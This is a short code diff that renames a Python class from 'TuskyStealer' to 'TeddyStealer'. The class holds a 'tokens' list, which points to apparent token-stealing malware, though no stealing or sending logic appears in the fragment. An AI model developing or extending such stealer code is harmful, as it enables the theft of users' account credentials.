@@ -51,7 +51,7 @@ class functions(object):
             return json.dumps(info)
 
 
-class TuskyStealer(functions):
+class TeddyStealer(functions):
     def __init__(self):
         super().__init__()
         self.tokens = []
